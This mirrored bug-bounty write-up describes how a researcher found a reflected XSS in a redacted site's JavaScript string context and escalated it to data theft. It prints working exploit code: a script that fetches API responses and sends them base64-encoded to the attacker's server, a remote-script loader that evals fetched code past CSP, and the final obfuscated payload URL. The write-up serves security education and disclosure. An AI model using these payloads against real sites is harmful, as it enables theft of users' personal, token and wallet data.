# :globe_with_meridians: Stealing your data using XSS. Hello peeps 🐥

> **Original Source:** [Stealing your data using XSS. Hello peeps 🐥](https://infosecwriteups.com/stealing-your-data-using-xss-bf7e4a31e6ee)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

## 27.04.2020


After completion of above said method of bug-hunting, I started looking into APIs working manner and all other things. While testing out things, I found very unusual redirection for `404 — Not Found` case, page was being loaded and then redirection was made to root endpoint i.e. `https://`█████`.com/` I also got intuitions that something is fishy here 🧐.


Read source code of the page, as page had too much HTML code, but was being redirected to root endpoint even before rendering of page. Handed this page to [Arjun](https://github.com/s0md3v/Arjun) 🏹 for finding any hidden parameter for any error message or something like that. Found a valid parameter which was being reflected in `<script>`tag’s string assignment i.e.

>

`*var foo = 'reflection'*`


This reflection also had only one blocked entity i.e. `“` double quotes and on random basis some symbols were not appearing in response,else there was no blocking of any `confirm()` or `eval()` or anything. I was amazed and surprised at the same time!


Again, I confirmed basic injection:

>

Payload: `?foo='+alert()+'`


Reflected: `var foo = ''+alert()+''` and beautiful alert at █████’s primary domain, this moment was unexpected and simply amazing! Just Imagine This!


But this time, I didn’t want to just report `alert(1)`🤧 . While testing APIs, I came to know APIs call can be made only from `https://`█████`.com` main-top domain and no sub-domains. So I just wanted to use this golden chance to escalate this to something higher. I googled and read many reports in which attackers demonstrated the impact escalation of XSS. Reading such things gave me great ideas to perform something out-of-box🤔.

## The Idea:


>

*Let’s call the APIs and copy their response and send that response to my personal server. Sounds very simple right? Haha, it wasn’t so easy🥴!*


## 🚀 Try 0x01:


As I am a person who is known to development and have on-hand experience with JavaScript while project development, so it was easy to get logic in my mind and the same in the code, but as I knew that I had very small window available, as the page where reflection is happening will be in redirection once page gets loaded. For the same, I used some fast-working logic instead of regular old way of using AJAX and then handling with their response success error and bla bla 👽.


## Get Viren Pawar’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


JavaScript snippet that I made for performing my idea:


```
function fe(t) {
fetch(t).then(t => t.text()).then(t => {
fetch("https://my-server.com/log/?p=" + btoa(t))
})
}
urls = ["https://█████.com/v1/api/.../...",
"https://█████.com/v2/api/.../...",
"https://█████.com/v3/api/.../...",
...
], urls.forEach(fe);
```


I think reading this twice or thrice will make you understand what is happening here. In summary: I have mentioned a function `fe()` which will make `GET` request to parameter value passed to this function, upon getting response back from server, make another `GET` request to `my-server.com` with base64 encoded value of response body. Next is list of `urls` which has to be called and we wish to collect, after completion of this list, call `forEach()` which will do our looping implicitly, without explicitly mentioning any `for()` or `while()` loop 🤖 .

>

Problem: This code snippet was very long for `GET` request length capacity


Solution: I hosted this JavaScript code on my server and now at the injection point, I just need to call this JavaScript code. Simple? Not really. As I have access to limited JavaScript context and CSP was also implemented.

## 🚀 Try 0x02:


I had access to `eval()`, so let’s add our hosted JavaScript using `eval()`. Read a lot of ways to do this, but they weren’t as fast as it was required, because the page where injection was happening, redirects to root endpoint once page loads. So I referred [JavaScript docs from Mozilla](https://developer.mozilla.org/en-US/docs/Web/JavaScript/). This helped me to get the desired speed for `eval()ing` my commands using `async` and `await` that would get my hosted script and execute it 💀.


JavaScript code for the primary injection point:


```
!async function() {
let a = await
function() {
fetch('https://my-server.com/log.js').then(t => t.text()).then(d => {
eval(d)
})
}()
}();
```


In summary: I have called this function importantly in asynchronous mode, calling one more function inside the function which is in await mode, which does make a request of my hosted JavaScript which is talked above. After getting response of this request, I have again `eval()ed` my JavaScript here, which solves the problem mentioned above. This solution can said to be proof of bypassing CSP rules for not allowing running script from un-trusted source.

>

Problem: Writing this too in GET request seems to generate errors at browser-end, didn’t knew why?


Solution: I did base64 encode entire above code snippet and submit this to `decodeURIComponent()` and passing that to `atob()` and passing that to `eval()` . Quite confusing?


```
█████.com/?foo='+eval(atob(decodeURIComponent('IWFzeW5jIGZ1bmN0aW9uKCkge2xldCBhID0gYXdhaXQgZnVuY3Rpb24oKSB7ZmV0Y2goJ2h0dHBzOi8vbXktc2VydmVyLmNvbS9sb2cuanMnKS50aGVuKHQgPT4gdC50ZXh0KCkpLnRoZW4oZCA9PiB7ZXZhbChkKX0pfSgpfSgpOwo=')))+'
```


>

Problem: Everything worked as desired, everything worked PERFECT, but for every 2/5 tries, page redirection would happen even before data stealing occurs.


## 🚀 Try 0x03:


For preventing the redirection from happening, I know that I have to break things, which may generate JavaScript errors, which eventually breaks JavaScript before reaching to redirection state. But before breaking the case, I had to perform all this actions and then I wish to have a explicit break.


After analyzing and many trial and errors, here was the final payload that I used to exploit data stealing.


```
█████.com/?foo='+eval(atob(decodeURIComponent('IWFzeW5jIGZ1bmN0aW9uKCkge2xldCBhID0gYXdhaXQgZnVuY3Rpb24oKSB7ZmV0Y2goJ2h0dHBzOi8vbXktc2VydmVyLmNvbS9sb2cuanMnKS50aGVuKHQgPT4gdC50ZXh0KCkpLnRoZW4oZCA9PiB7ZXZhbChkKX0pfSgpfSgpOwo=')))+'});var foo='{ 1,
```


This final payload, stopped redirection + executed things in the way I was wishing to see. 🤟 It was really challenging, as this was my first on-hand experience to deal with such issues and solving them in any real BB program.


At this moment, this malicious crafted URL can be shared and populate around the user, user’s whose account is logged-in will get directly affected by this. There will be zero-sign of data being steal in background. I demonstrated passive activity like calling APIs and routing them to my server and collect them. For any logged-in user who clicks this crafted URL, the risks are:


- Leakage of user profile details like: fullname, email, mobile number, date of account creation, user type, userids, ssotoken and much more.

- Leakage of user address details like: all added address, receiver name, addressid, complete address, mobile number, timestamp.

- Leakage of user wallet details like: balance available in wallet, ownedGUID, ssoId.

- Leakage of Order details: orderId, ordered item, quantity, status and basically every order detail you see in your profile.

- Besides all these, I can passively enumerate each and every action which is done by the logged in user like wallet statement, order history, frequently recharged mobile numbers list and much more and all this can be done by just adding more API address in the JavaScript code which is hosted at my server.


One more thing to note over here is, this attack is not restricted to passive actions, I could perform more active actions, like transferring wallet balance, do order without interaction and many more things using its API call, performing mobile recharge, deleting user address, unsubscribe from subscriptions, and many more things. *But I did a mistake that I hadn’t provided POC for this active attacks, which eventually decreased reward amount*. Not a problem, one more lesson learnt 💪.

---

*Originally published on [Medium](https://infosecwriteups.com/stealing-your-data-using-xss-bf7e4a31e6ee). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
